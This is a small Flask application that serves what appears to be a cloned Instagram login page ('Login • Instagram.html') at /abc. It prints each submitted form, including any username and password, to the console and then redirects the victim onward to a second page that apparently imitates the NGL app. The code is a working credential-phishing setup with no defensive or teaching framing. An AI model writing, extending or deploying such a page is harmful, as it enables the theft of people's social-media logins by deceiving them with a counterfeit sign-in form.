from flask import Flask, render_template, request, redirect
import logging
import os 
dir_path = os.path.dirname(os.path.realpath(__file__))
print(dir_path)

app = Flask("__main__", template_folder="templates", static_folder="static")
logging.basicConfig(level=logging.DEBUG)


@app.route("/saanvi_17")
def saanvi_17():
    return render_template("home.html")


@app.route("/abc")
def abc():
    return render_template("Login • Instagram.html")


@app.route("/after")
def after():
    return render_template("after.html")


@app.route("/abc", methods=["POST", "GET"])
def run_insta_code():
    if request.method == "POST":
        print(request.form)
        return redirect("http://127.0.0.1:5000/saanvi_17")


@app.route("/saanvi_17", methods=["POST", "GET"])
def run_ngl_code():
    if request.method == "POST":
        print(request.form)
        return redirect("http://127.0.0.1:5000/after")


if __name__ == "__main__":
    app.run()
